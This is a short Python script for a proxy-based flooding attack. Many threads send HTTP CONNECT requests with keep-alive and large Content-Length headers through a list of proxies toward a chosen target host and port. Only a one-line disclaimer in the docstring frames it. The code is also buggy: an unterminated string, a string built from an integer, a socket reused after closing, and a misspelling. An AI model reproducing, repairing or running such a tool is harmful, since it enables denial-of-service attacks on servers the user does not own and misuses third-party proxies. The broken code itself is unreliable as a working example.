#!/usr/bin/env python
"""
    READ the read.me before use. Attacking servers you don't own is highly illegal
    and the author in no way supports misuse of this tool
"""
import socket
import threading
import sys
import argparse
from time import sleep

exitscript = False

def striker(target,port,proxylist):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    while not exitscript:
        with open(proxylist, 'r') as plist:
            for line in plist:
                proxyip = line.split(':')[0]
                pport = line.split(':')[1]
                pport = int(pport)
                try:
                    s.connect((proxyip,pport))
                except:
                    s.close()
                    continue
                try:
                    s.send("CONNECT"+target+":"+port+" HTTP/1.0\n Connection: keep-alive\n Keep-Alive: 3000\n Content-Length: 1000000\n Cache-Control: no-cache\n)
                except:
                    s.close()
                    continue
                print "Sent connect requext to: %s" % target
                s.close()



def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", help="Target ip/url",required = True)
    parser.add_argument("--port",help="Target port",type=int,required = True)
    parser.add_argument("--threads",help="Number of threads to use",type=int,required = True)
    parser.add_argument("--proxies",help="File containing proxy servers",required = True)
    args = parser.parse_args()

    target = args.target
    port = args.port
    numthreads = args.threads
    proxylist = args.proxies
    threads = []
    for i in range(0,numthreads):
        t = threading.Thread(target=striker, args=(target,port,proxylist))
        threads.append(t)
        #t.start()
    for i in range(0,numthreads):
        threads[i].start()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        exitscript = True
        raise
